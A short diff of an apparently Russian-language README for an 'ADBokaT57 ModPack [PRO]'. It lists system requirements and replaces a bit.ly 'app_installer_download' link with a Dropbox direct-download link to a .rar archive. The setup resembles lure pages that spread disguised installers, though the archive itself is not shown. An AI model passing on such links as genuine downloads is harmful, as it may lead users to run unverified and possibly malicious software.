@@ -11,7 +11,7 @@
 * ОЗУ - 4 ГБ или более
 * Дисковое пространство - 2 ГБ свободного места
 
-## 🔐 [СКАЧАТЬ ADBokaT57 МодПак [PRO]](https://bit.ly/app_installer_download)
+## 🔐 [СКАЧАТЬ ADBokaT57 МодПак [PRO]](https://www.dropbox.com/scl/fi/aq32aqxqsi658bx73vt6a/ADBokaT57-ModPack.rar?rlkey=urvsfdigvckvzrdlwyggqxz89&dl=1)
 
 ![alt-text](https://i.imgur.com/Rk9mu2k.jpeg)
 
